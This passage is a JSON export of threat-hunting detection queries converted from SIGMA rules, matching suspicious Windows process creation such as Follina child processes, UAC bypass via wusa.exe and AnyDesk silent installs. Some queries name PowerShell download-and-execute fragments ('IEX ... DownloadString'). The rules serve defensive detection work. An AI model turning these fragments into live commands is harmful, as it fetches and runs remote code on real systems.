            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Process Creation Using Sysnative Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \":\\Windows\\Sysnative\\\" or tgt.process.image.path contains \":\\Windows\\Sysnative\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 655
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1218"
            ],
            "name": "Sdiagnhost Calling Suspicious Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\sdiagnhost.exe\" and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\taskkill.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\calc.exe\")) and (not ((tgt.process.image.path contains \"\\cmd.exe\" and tgt.process.cmdline contains \"bits\") or (tgt.process.image.path contains \"\\powershell.exe\" and (tgt.process.cmdline contains \"-noprofile -\" or tgt.process.cmdline contains \"-noprofile\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 656
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process related to rasdial.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious RASdial Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"rasdial.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 657
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects audio capture via PowerShell Cmdlet.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1123"
            ],
            "name": "Audio Capture via PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"WindowsAudioDevice-Powershell-Cmdlet\" or tgt.process.cmdline contains \"Toggle-AudioDevice\" or tgt.process.cmdline contains \"Get-AudioDevice \" or tgt.process.cmdline contains \"Set-AudioDevice \" or tgt.process.cmdline contains \"Write-AudioDevice \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 658
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks or terminal profiles.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Potentially Suspicious Child Process Of VsCode",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\code.exe\" and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (tgt.process.cmdline contains \"Invoke-Expressions\" or tgt.process.cmdline contains \"IEX\" or tgt.process.cmdline contains \"Invoke-Command\" or tgt.process.cmdline contains \"ICM\" or tgt.process.cmdline contains \"DownloadString\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\")) or (tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\Temp\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 659
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Arbitrary File Download Via Squirrel.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\squirrel.exe\" or tgt.process.image.path contains \"\\update.exe\") and (tgt.process.cmdline contains \" --download \" or tgt.process.cmdline contains \" --update \" or tgt.process.cmdline contains \" --updateRollback=\") and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 660
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1036"
            ],
            "name": "Potential Homoglyph Attack Using Lookalike Characters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\u0410\" or tgt.process.cmdline contains \"\u0412\" or tgt.process.cmdline contains \"\u0415\" or tgt.process.cmdline contains \"\u041a\" or tgt.process.cmdline contains \"\u041c\" or tgt.process.cmdline contains \"\u041d\" or tgt.process.cmdline contains \"\u041e\" or tgt.process.cmdline contains \"\u0420\" or tgt.process.cmdline contains \"\u0421\" or tgt.process.cmdline contains \"\u0422\" or tgt.process.cmdline contains \"\u0425\" or tgt.process.cmdline contains \"\u0405\" or tgt.process.cmdline contains \"\u0406\" or tgt.process.cmdline contains \"\u0408\" or tgt.process.cmdline contains \"\u04ae\" or tgt.process.cmdline contains \"\u04c0\" or tgt.process.cmdline contains \"\u050c\" or tgt.process.cmdline contains \"\u051a\" or tgt.process.cmdline contains \"\u051c\" or tgt.process.cmdline contains \"\u0391\" or tgt.process.cmdline contains \"\u0392\" or tgt.process.cmdline contains \"\u0395\" or tgt.process.cmdline contains \"\u0396\" or tgt.process.cmdline contains \"\u0397\" or tgt.process.cmdline contains \"\u0399\" or tgt.process.cmdline contains \"\u039a\" or tgt.process.cmdline contains \"\u039c\" or tgt.process.cmdline contains \"\u039d\" or tgt.process.cmdline contains \"\u039f\" or tgt.process.cmdline contains \"\u03a1\" or tgt.process.cmdline contains \"\u03a4\" or tgt.process.cmdline contains \"\u03a5\" or tgt.process.cmdline contains \"\u03a7\") or (tgt.process.cmdline contains \"\u0430\" or tgt.process.cmdline contains \"\u0435\" or tgt.process.cmdline contains \"\u043e\" or tgt.process.cmdline contains \"\u0440\" or tgt.process.cmdline contains \"\u0441\" or tgt.process.cmdline contains \"\u0445\" or tgt.process.cmdline contains \"\u0455\" or tgt.process.cmdline contains \"\u0456\" or tgt.process.cmdline contains \"\u04cf\" or tgt.process.cmdline contains \"\u0458\" or tgt.process.cmdline contains \"\u04bb\" or tgt.process.cmdline contains \"\u0501\" or tgt.process.cmdline contains \"\u051b\" or tgt.process.cmdline contains \"\u051d\" or tgt.process.cmdline contains \"\u03bf\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 661
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566",
                "t1203",
                "t1059"
            ],
            "name": "Suspicious HWP Sub Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\Hwp.exe\" and tgt.process.image.path contains \"\\gbb.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 662
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects creation of a scheduled task with a GUID like name",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Scheduled Task Name As GUID",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/Create \") and (tgt.process.cmdline contains \"/TN \\\"{\" or tgt.process.cmdline contains \"/TN '{\" or tgt.process.cmdline contains \"/TN {\") and (tgt.process.cmdline contains \"}\\\"\" or tgt.process.cmdline contains \"}'\" or tgt.process.cmdline contains \"} \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 663
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Sdclt Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\sdclt.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 664
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"cloudflared\" binary from a non standard location.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "Cloudflared Portable Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\cloudflared.exe\" and (not (tgt.process.image.path contains \":\\Program Files (x86)\\cloudflared\\\" or tgt.process.image.path contains \":\\Program Files\\cloudflared\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 665
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell Download and Execute Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"IEX ((New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \"IEX (New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \"IEX((New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \"IEX(New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \" -command (New-Object System.Net.WebClient).DownloadFile(\" or tgt.process.cmdline contains \" -c (New-Object System.Net.WebClient).DownloadFile(\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 666
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using NTFS Reparse Point - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\\"C:\\Windows\\system32\\wusa.exe\\\"  /quiet C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\update.msu\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))) or (src.process.cmdline=\"\\\"C:\\Windows\\system32\\dism.exe\\\" /online /quiet /norestart /add-package /packagepath:\\\"C:\\Windows\\system32\\pe386\\\" /ignorecheck\" and (tgt.process.integrityLevel in (\"High\",\"System\")) and (tgt.process.cmdline contains \"C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" and tgt.process.cmdline contains \"\\dismhost.exe {\") and tgt.process.image.path contains \"\\DismHost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 667
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts of decoding encoded Gzip archives via PowerShell.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1132"
            ],
            "name": "Gzip Archive Decode Via PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"GZipStream\" and tgt.process.cmdline contains \"::Decompress\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 668
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - AnyDesk Silent Installation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"--install\" and tgt.process.cmdline contains \"--start-with-win\" and tgt.process.cmdline contains \"--silent\")) | columns tgt.process.cmdline,src.process.cmdline,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 669
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"cmd.exe\" via the AnyViewer RMM agent on a remote management sessions.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - Cmd.EXE Execution via AnyViewer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\AVCore.exe\" and src.process.cmdline contains \"AVCore.exe\\\" -d\" and tgt.process.image.path contains \"\\cmd.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 670
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the Ammy Admin RMM agent for remote management.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
